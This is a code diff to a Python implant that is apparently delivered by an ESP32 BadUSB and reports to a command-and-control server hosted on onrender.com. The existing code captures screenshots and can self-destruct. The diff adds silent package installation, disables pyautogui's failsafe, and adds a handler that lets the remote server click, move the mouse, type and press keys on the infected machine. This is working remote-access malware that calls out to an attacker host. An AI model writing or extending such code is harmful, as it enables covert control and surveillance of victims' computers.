@@ -6,14 +6,18 @@ import io
 import socketio
 try:
     from PIL import ImageGrab
+    import pyautogui
 except ImportError:
-    print("Installing PIL...")
+    print("Installing required packages...")
     import subprocess
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow", "python-socketio", "requests", "websocket-client"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow", "python-socketio", "requests", "websocket-client", "pyautogui"])
     from PIL import ImageGrab
+    import pyautogui
+    
+pyautogui.FAILSAFE = False
 
 # Configuration
-SERVER_URL = "https://esp32-badusb.onrender.com/" # Change this to your deployed Render URL later
+SERVER_URL = "https://esp32-badusb.onrender.com" # Updated Render URL
 HEARTBEAT_INTERVAL = 1.0 # seconds
 SCREENSHOT_INTERVAL = 2.0 # seconds
 
@@ -38,13 +42,32 @@ def set_mode(mode):
 @sio.event
 def execute_command(cmd):
     print_log(f"Received Command from C2: {cmd}")
-    # In a real AI scenario, you would pass this to an LLM or PyAutoGUI to actually click/type.
-    # For now, we just print it.
     if cmd.lower() == "test":
         print_log("Executing test command...")
     elif cmd.lower() == "kill":
         print_log("Kill command received. Self-destructing.")
         self_destruct()
+
+@sio.event
+def execute_json_command(data):
+    print_log(f"Received JSON Command: {data}")
+    try:
+        action = data.get("action")
+        x = data.get("x")
+        y = data.get("y")
+        text = data.get("text")
+        key = data.get("key")
+
+        if action == "click" and x is not None and y is not None:
+            pyautogui.click(x=int(x), y=int(y))
+        elif action == "move" and x is not None and y is not None:
+            pyautogui.moveTo(int(x), int(y))
+        elif action == "type" and text:
+            pyautogui.typewrite(text)
+        elif action == "press" and key:
+            pyautogui.press(key)
+    except Exception as e:
+        print_log(f"Failed to execute JSON command: {e}")
 
 @sio.event
 def disconnect():
